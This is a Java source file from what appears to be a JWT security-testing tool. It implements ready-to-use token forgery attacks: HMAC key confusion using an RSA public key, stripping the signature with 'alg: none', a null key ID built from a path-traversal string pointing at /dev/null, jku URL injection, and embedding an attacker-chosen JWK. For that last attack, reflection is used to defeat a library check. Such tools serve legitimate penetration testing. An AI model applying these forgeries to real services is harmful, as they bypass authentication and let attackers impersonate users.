/*
Author : Fraser Winterborn

Copyright 2021 BlackBerry Limited

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package com.blackberry.jwteditor.operations;

import com.blackberry.jwteditor.utils.CryptoUtils;
import com.blackberry.jwteditor.utils.PEMUtils;
import com.blackberry.jwteditor.model.jose.JWS;
import com.blackberry.jwteditor.model.keys.JWKKey;
import com.blackberry.jwteditor.model.keys.Key;
import com.blackberry.jwteditor.utils.Utils;
import com.nimbusds.jose.JOSEObjectType;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.OctetSequenceKey;
import com.nimbusds.jose.util.Base64URL;

import java.lang.reflect.Field;
import java.net.URI;
import java.net.URISyntaxException;

/**
 * Implementations of common JWS attacks
 */
public class Attacks {

    /**
     * Perform a HMAC key confusion attack
     *
     * Method based on the post at
     * https://www.nccgroup.com/ae/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
     *
     * @param jws                   the JWS to sign
     * @param key                   the public key to use for the attack
     * @param algorithm             the HMAC algorithm to sign with
     * @param stripTrailingNewlines remove trailing '/n' characters from the public
     *                              key
     * @return a JWS signed using HMAC with the RSA public key
     * @throws PEMUtils.PemException        if the RSA public key is not a valid PEM
     * @throws Key.UnsupportedKeyException  if HMAC key creation fails
     * @throws CryptoUtils.SigningException if signing fails
     */
    public static JWS hmacKeyConfusion(JWS jws, JWKKey key, JWSAlgorithm algorithm, boolean stripTrailingNewlines)
            throws PEMUtils.PemException, Key.UnsupportedKeyException, CryptoUtils.SigningException {

        // Convert the key to its public key in PEM format
        byte[] pemBytes = PEMUtils.jwkToPem(key.getJWK().toPublicJWK()).getBytes();

        // Remove any trailing /n (0xOA) characters from the PEM
        if (stripTrailingNewlines) {
            pemBytes = Utils.trimTrailingBytes(pemBytes, (byte) 0x0A);
        }

        // Build a new header for the chosen HMAC algorithm
        JWSHeader signingInfo = new JWSHeader.Builder(algorithm).type(JOSEObjectType.JWT).build();

        // Construct a HMAC signing key from the PEM bytes
        JWKKey signingKey = new JWKKey(new OctetSequenceKey.Builder((pemBytes)).build());

        // Sign and return the new JWS
        return CryptoUtils.sign(signingInfo.toBase64URL(), jws.getEncodedPayload(), signingKey, signingInfo);
    }

    /**
     * Remove the signature from a JWS
     *
     * @param jws the JWS to use for the attack
     * @return the modified JWS
     */
    public static JWS noneSigning(JWS jws) {
        Base64URL header = Base64URL.encode("{\"typ\":\"JWT\",\"alg\":\"none\"}"); // NON-NLS
        return new JWS(header, jws.getEncodedPayload(), Base64URL.encode(new byte[0]));
    }

    /**
     * Choose NULL kid and sign JWS with null signature
     *
     * @param jws the JWS to use for the attack
     * @return the modified JWS
     */
    public static JWS nullKid(JWS jws)
            throws PEMUtils.PemException, Key.UnsupportedKeyException, CryptoUtils.SigningException {
        // Construct a NULL signing key
        JWKKey nullSigningKey = new JWKKey(new OctetSequenceKey.Builder(new Base64URL("AA==")).build());

        // Build a new header for the null kid and HMAC algorithm
        com.nimbusds.jose.JWSAlgorithm alg = new com.nimbusds.jose.JWSAlgorithm("HS256");
        JWSHeader nullSigningInfo = new JWSHeader.Builder(alg).type(JOSEObjectType.JWT)
                .keyID("..\u002f..\u002f..\u002f..\u002f..\u002fdev\u002fnull").build();

        return CryptoUtils.sign(nullSigningInfo.toBase64URL(), jws.getEncodedPayload(), nullSigningKey,
                nullSigningInfo);
    }

    /**
     * Inject given Jku into the header; optionally resign if valid key supplied
     *
     * @param jws the JWS to use for the attack     
     * @param jku the jku string to inject     
     * @param key the key to use to resign the JWS
     * @return the modified JWS
     * @throws URISyntaxException
     */
    public static JWS injectJku(JWS jws, String jku)
            throws PEMUtils.PemException, Key.UnsupportedKeyException, CryptoUtils.SigningException, URISyntaxException {
        // Construct a NULL signing key
        //JWKKey nullSigningKey = new JWKKey(new OctetSequenceKey.Builder(new Base64URL("AA==")).build());

        // Build a new header for the null kid and HMAC algorithm
        com.nimbusds.jose.JWSAlgorithm alg = new com.nimbusds.jose.JWSAlgorithm("RS256");
        JWSHeader header = new JWSHeader.Builder(alg).type(JOSEObjectType.JWT).jwkURL(new URI(jku)).build();

        return new JWS(header.toBase64URL(), jws.getEncodedPayload(), jws.getEncodedSignature());
    }

    /**
     * Perform the embedded JWK attack
     *
     * @param jws       the JWS to attack
     * @param key       the JWK to embed
     * @param algorithm the algorithm to use for signing
     * @return a JWS with embedded JWK
     * @throws CryptoUtils.SigningException if signing fails
     */
    public static JWS embeddedJWK(JWS jws, JWKKey key, JWSAlgorithm algorithm)
            throws CryptoUtils.SigningException, NoSuchFieldException, IllegalAccessException {
        JWK embeddedKey = key.isPublic() ? key.getJWK().toPublicJWK() : key.getJWK();
        JWSHeader.Builder jwsHeaderBuilder = new JWSHeader.Builder(algorithm)
                .type(JOSEObjectType.JWT)
                .keyID(key.getID());

        // nimbus-jose-jwt adds a check to jwk() to prevent embedding private keys in
        // 9.21
        // We need to do this, so bypass the check using reflection
        Field f = jwsHeaderBuilder.getClass().getDeclaredField("jwk"); // NON-NLS
        f.setAccessible(true);
        f.set(jwsHeaderBuilder, embeddedKey);

        JWSHeader jwsHeader = jwsHeaderBuilder.build();

        return CryptoUtils.sign(jwsHeader.toBase64URL(), jws.getEncodedPayload(), key, jwsHeader);
    }

}
